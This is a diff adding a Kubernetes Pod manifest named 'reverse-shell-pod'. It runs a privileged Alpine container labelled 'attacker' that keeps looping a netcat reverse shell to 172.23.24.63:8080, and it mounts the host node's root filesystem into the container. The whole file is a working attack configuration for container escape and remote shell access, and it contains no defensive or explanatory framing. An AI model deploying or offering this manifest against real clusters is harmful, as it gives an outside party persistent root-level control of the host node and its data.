@@ -1,0 +1,31 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-pod
+  namespace: cass-operator
+spec:
+  nodeName: worker-1 
+  containers:
+    - name: attacker
+      image: alpine
+      securityContext:
+        privileged: true
+      command:
+        - /bin/sh
+        - -c
+        - |
+          # Use busybox netcat (already available in Alpine)
+          # Loop to keep trying reverse shell connection
+          while true; do
+            nc 172.23.24.63 8080 -e /bin/sh;
+            sleep 5;
+          done
+      volumeMounts:
+        - mountPath: /host
+          name: host-root
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Never
